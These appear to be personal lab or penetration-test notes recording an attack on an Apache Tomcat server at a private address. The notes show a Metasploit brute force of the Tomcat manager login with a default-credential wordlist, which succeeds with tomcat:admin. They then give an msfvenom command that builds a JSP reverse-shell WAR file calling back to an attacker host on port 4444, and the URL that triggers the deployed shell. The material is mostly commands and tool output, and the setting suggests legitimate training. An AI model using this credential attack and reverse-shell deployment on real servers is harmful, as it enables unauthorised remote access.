Set up MSF scanner module:

```[msf](Jobs:0 Agents:0) >> use 23
[msf](Jobs:0 Agents:0)
 auxiliary(scanner/http/tomcat_mgr_login) >> set rhost 172.16.5.200
rhost => 172.16.5.200
[msf](Jobs:0 Agents:0)
 auxiliary(scanner/http/tomcat_mgr_login) >> set stop_on_success true
stop_on_success => true
[msf](Jobs:0 Agents:0)
 auxiliary(scanner/http/tomcat_mgr_login) >> show options 

Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name            Current Settin  Required  Description
                   g
   ----            --------------  --------  -----------
   BLANK_PASSWORD  false           no        Try blank passwords
   S                                         for all users
   BRUTEFORCE_SPE  5               yes       How fast to brutefor
   ED                                        ce, from 0 to 5
   DB_ALL_CREDS    false           no        Try each user/passwo
                                             rd couple stored in
                                             the current database
   DB_ALL_PASS     false           no        Add all passwords in
                                              the current databas
                                             e to the list
   DB_ALL_USERS    false           no        Add all users in the
                                              current database to
                                              the list
   DB_SKIP_EXISTI  none            no        Skip existing creden
   NG                                        tials stored in the
                                             current database (Ac
                                             cepted: none, user,
                                             user&realm)
   PASSWORD                        no        The HTTP password to
                                              specify for authent
                                             ication
   PASS_FILE       /usr/share/met  no        File containing pass
                   asploit-framew            words, one per line
                   ork/data/wordl
                   ists/tomcat_mg
                   r_default_pass
                   .txt
   Proxies                         no        A proxy chain of for
                                             mat type:host:port[,
                                             type:host:port][...]
   RHOSTS          172.16.5.200    yes       The target host(s),
                                             see https://github.c
                                             om/rapid7/metasploit
                                             -framework/wiki/Usin
                                             g-Metasploit
   RPORT           8080            yes       The target port (TCP
                                             )
   SSL             false           no        Negotiate SSL/TLS fo
                                             r outgoing connectio
                                             ns
   STOP_ON_SUCCES  true            yes       Stop guessing when a
   S                                          credential works fo
                                             r a host
   TARGETURI       /manager/html   yes       URI for Manager logi
                                             n. Default is /manag
                                             er/html
   THREADS         1               yes       The number of concur
                                             rent threads (max on
                                             e per host)
   USERNAME                        no        The HTTP username to
                                              specify for authent
                                             ication
   USERPASS_FILE   /usr/share/met  no        File containing user
                   asploit-framew            s and passwords sepa
                   ork/data/wordl            rated by space, one
                   ists/tomcat_mg            pair per line
                   r_default_user
                   pass.txt
   USER_AS_PASS    false           no        Try the username as
                                             the password for all
                                              users
   USER_FILE       /usr/share/met  no        File containing user
                   asploit-framew            s, one per line
                   ork/data/wordl
                   ists/tomcat_mg
                   r_default_user
                   s.txt
   VERBOSE         true            yes       Whether to print out
                                             put for all attempts
   VHOST                           no        HTTP server virtual
                                             host
``` 

Run scanner and got a hit.

``` auxiliary(scanner/http/tomcat_mgr_login) >> run

[-] http://172.16.5.200:8080 - Authorization not requested
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
[msf](Jobs:0 Agents:0)
 auxiliary(scanner/http/tomcat_mgr_login) >> run

[!] No active DB -- Credential data will not be saved!
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:root (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:vagrant (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:QLogic66 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:password (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:Password1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:changethis (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:r00t (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:toor (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:password1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:j2deployer (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:OvW*busr1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:kdsxc (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:owaspba (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:ADMIN (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: admin:xampp (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:admin (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:manager (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:role1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:root (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:tomcat (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:s3cret (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:vagrant (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:QLogic66 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:password (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:Password1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:changethis (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:r00t (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:toor (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:password1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:j2deployer (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:OvW*busr1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:kdsxc (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:owaspba (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:ADMIN (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: manager:xampp (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:admin (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:manager (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:role1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:root (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:tomcat (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:s3cret (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:vagrant (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:QLogic66 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:password (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:Password1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:changethis (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:r00t (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:toor (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:password1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:j2deployer (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:OvW*busr1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:kdsxc (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:owaspba (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:ADMIN (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role1:xampp (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:admin (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:manager (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:role1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:root (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:tomcat (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:s3cret (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:vagrant (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:QLogic66 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:password (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:Password1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:changethis (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:r00t (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:toor (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:password1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:j2deployer (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:OvW*busr1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:kdsxc (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:owaspba (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:ADMIN (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: role:xampp (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:admin (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:manager (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:role1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:root (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:tomcat (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:s3cret (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:vagrant (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:QLogic66 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:password (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:Password1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:changethis (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:r00t (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:toor (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:password1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:j2deployer (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:OvW*busr1 (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:kdsxc (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:owaspba (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:ADMIN (Incorrect)
[-] 172.16.5.200:8080 - LOGIN FAILED: root:xampp (Incorrect)
[+] 172.16.5.200:8080 - Login Successful: tomcat:admin
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```
![[Pasted image 20260126144102.png]]
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.5.225 LPORT=4444 -f war > backup.war
```

![[Pasted image 20260126152438.png]]
open http://172.16.5.200:8080/backup/

![[Pasted image 20260126153029.png]]